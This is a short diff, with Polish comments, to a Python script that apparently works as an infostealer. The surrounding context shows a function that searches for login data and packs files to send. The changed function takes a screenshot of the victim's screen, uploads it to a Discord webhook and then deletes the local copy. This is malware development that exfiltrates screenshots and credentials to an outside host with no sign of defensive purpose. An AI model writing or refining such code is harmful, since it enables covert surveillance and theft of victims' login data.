@@ -99,12 +99,16 @@ def search_for_login_data():
         else:
             print("Brak plików do spakowania i wysłania.")
 
-# Funkcja do robienia zrzutu ekranu i wysyłania na Discord
+# Funkcja do robienia zrzutu ekranu na pulpit i wysyłania go na Discord
 def send_screenshot_to_discord():
-    screenshot_path = r"C:\screenshot.png"  # Zmieniono ścieżkę na C:
+    # Ścieżka do zapisu na pulpicie użytkownika
+    screenshot_path = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'screenshot.png')
+    
+    # Robienie zrzutu ekranu
     screenshot_file = take_screenshot(screenshot_path)
     
     if screenshot_file:
+        # Wysyłanie zrzutu ekranu na Discord
         send_file_to_discord(screenshot_file, webhook_url_1)
         
         # Usuwanie zrzutu ekranu po wysłaniu
